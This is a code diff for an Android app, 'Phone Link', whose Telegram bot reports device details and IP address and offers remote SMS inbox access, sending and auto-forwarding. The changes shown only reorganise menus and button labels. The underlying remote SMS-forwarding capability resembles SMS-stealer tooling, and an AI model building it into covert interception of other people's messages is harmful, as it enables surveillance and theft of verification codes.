@@ -35,7 +35,7 @@ class TelegramBot(
 📱 ${info.brandModel}
 🤖 Android: ${info.androidVersion}
 ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.batteryPercent}% ($chargingText)
-🌐 Dashboard: http://${info.ipAddress}:8080
+${DeviceInfoHelper.getCountryFlag(context)} ${info.ipAddress}:8080
             """.trimIndent()
             sendMessage(ownerChatId, text, buildMainMenu())
         }
@@ -109,7 +109,7 @@ ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.battery
                 userState.remove(chatId)
                 sendMessage(chatId, "✅ Added SMS forward: ${text.trim()}", buildForwardMenu())
             }
-            else -> sendMessage(chatId, "👋 Welcome to *Phone Link*\nChoose an option:", buildMainMenu())
+            else -> sendMessage(chatId, "👋 Welcome to *Phone Link*", buildMainMenu())
         }
     }
 
@@ -132,7 +132,7 @@ ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.battery
             data == "menu_devices"  -> showManageDevices(chatId)
             data == "menu_main"     -> sendMessage(chatId, "📱 *Phone Link*\nChoose an option:", buildMainMenu())
             data == "device_sms"    -> showSmsManager(chatId)
-            data == "devices_refresh" -> showManageDevices(chatId)
+
 
             // ── SMS Manager folders ──
             data == "sms_inbox"   -> { setPage(chatId, "inbox", 0);   showInbox(chatId, 0) }
@@ -165,7 +165,7 @@ ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.battery
                 ForwardManager.clearAll(context)
                 sendMessage(chatId, "🗑️ All forward targets removed.", buildForwardMenu())
             }
-            data == "fwd_back" -> sendMessage(chatId, "📱 *Phone Link*\nChoose an option:", buildMainMenu())
+            data == "fwd_back" -> showManageDevices(chatId)
 
             data == "action_cancel" -> {
                 userState.remove(chatId); userTempData.remove(chatId)
@@ -206,10 +206,10 @@ ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.battery
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
                     put(btn("💬 SMS Manager", "device_sms"))
+                    put(btn("✉️ Send Message", "menu_send"))
                 })
                 put(JSONArray().apply {
-                    put(btn("🔄 Refresh", "devices_refresh"))
-                    put(btn("🔙 Back", "menu_main"))
+                    put(btn("📋 Auto-Forward", "menu_forwards"))
                 })
                 if (status == ConnectionMonitor.Status.OFFLINE) {
                     put(JSONArray().apply { put(btn("🔄 Reconnect Now", "action_reconnect")) })
@@ -389,15 +389,7 @@ ${DeviceInfoHelper.getBatteryEmoji(info.batteryPercent)} Battery: ${info.battery
     private fun buildMainMenu() = JSONObject().apply {
         put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
-                put(btn("📥 Inbox", "menu_inbox"))
-                put(btn("📤 Sent", "menu_sent"))
-            })
-            put(JSONArray().apply {
-                put(btn("✉️ Send Message", "menu_send"))
                 put(btn("📱 Manage Devices", "menu_devices"))
-            })
-            put(JSONArray().apply {
-                put(btn("📋 Auto-Forward", "menu_forwards"))
             })
         })
     }
